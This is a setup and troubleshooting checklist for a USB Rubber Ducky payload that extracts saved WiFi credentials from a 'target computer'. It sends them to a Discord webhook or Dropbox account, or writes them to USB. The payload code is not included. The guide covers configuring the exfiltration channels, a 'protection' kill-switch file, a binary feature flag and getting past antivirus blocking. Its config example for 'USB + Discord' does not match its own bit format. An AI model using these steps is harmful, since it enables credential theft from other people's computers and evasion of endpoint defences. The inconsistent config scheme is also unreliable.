================================================================================
                         STEP-BY-STEP SETUP
================================================================================

--- STEP 1: BASIC CONFIGURATION ---

[  ] 1. Open payload.txt in text editor
[  ] 2. Find line: DEFINE #DRIVE E:
[  ] 3. Change E: to your USB drive letter if different (check File Explorer)
[  ] 4. Find line: DEFINE #FILENAME wifi_vault
[  ] 5. Change to any name you want (no spaces, no special characters)

--- STEP 2: CHOOSE EXPORT METHOD(S) ---

IF USING DISCORD:
  [  ] 1. Go to your Discord server
  [  ] 2. Create a webhook (Server Settings → Webhooks → New Webhook)
  [  ] 3. Copy the webhook URL
  [  ] 4. Find line: DEFINE #WEBHOOK YOUR_WEBHOOK_URL
  [  ] 5. Paste your URL between the quotes

IF USING DROPBOX:
  [  ] 1. Go to https://www.dropbox.com/developers
  [  ] 2. Create app and get access token
  [  ] 3. Find line: DEFINE #DROPBOX YOUR_DROPBOX_TOKEN
  [  ] 4. Paste your token between the quotes

IF USING CUSTOM LOCATION:
  [  ] 1. Find line: DEFINE #CUSTOM_PATH C:\Users\Public
  [  ] 2. Change to desired folder (e.g., C:\Temp, D:\Data, etc.)

--- STEP 3: ENABLE PROTECTION MODE (OPTIONAL) ---

Protection mode prevents payload from running if specific file exists.

  [  ] 1. Find line: DEFINE #PROTECTION_FILE my_password
  [  ] 2. You can change 'my_password' to any filename you want
  [  ] 3. To activate: put file on Desktop with that name
  [  ] 4. Update config bit 4 to 1 (see BINARY CONFIG section)

--- STEP 4: SET YOUR BINARY CONFIG ---

This controls which features are active:

  [  ] 1. Find line: DEFINE #CONFIG 110011
  [  ] 2. Choose preset from "PRESET CONFIGURATIONS" section above
  [  ] 3. Replace 110011 with your chosen preset
  [  ] 4. Save the file

================================================================================
                          BINARY CONFIG EXPLAINED
================================================================================

Format: [Save to USB] [Dropbox] [Custom] [Protection] [AutoCreate] [Reserved]

Example: 110011
         ││││││
         ││││││
         │││││└─ Reserved (always 0)
         ││││└── Auto-Create: 1=yes, 0=no
         │││└─── Protection: 1=yes, 0=no
         ││└──── Custom Location: 1=yes, 0=no
         │└───── Dropbox: 1=yes, 0=no
         └────── USB: 1=yes, 0=no

To BUILD YOUR OWN CONFIG:
  1. Decide for each feature: 1=ON, 0=OFF
  2. Write them in order: [USB][Dropbox][Custom][Protection][AutoCreate][0]
  3. Paste into #CONFIG

Example: Want USB + Discord only?
  Result: 100010

================================================================================
                          TROUBLESHOOTING
================================================================================

PROBLEM: File not created on USB
SOLUTION: 
  - Check USB drive letter is correct
  - Try a different USB port
  - USB may need admin permissions

PROBLEM: Credentials not extracted
SOLUTION:
  - Admin privileges may be needed
  - Some WiFi security types don't show password
  - Try on different network

PROBLEM: Discord not receiving data
SOLUTION:
  - Check webhook URL is correct
  - Webhook may be expired (create new one)
  - Check firewall isn't blocking connection

PROBLEM: Payload won't run at all
SOLUTION:
  - Re-flash USB Rubber Ducky
  - Check Windows Defender/antivirus isn't blocking
  - Try different target computer
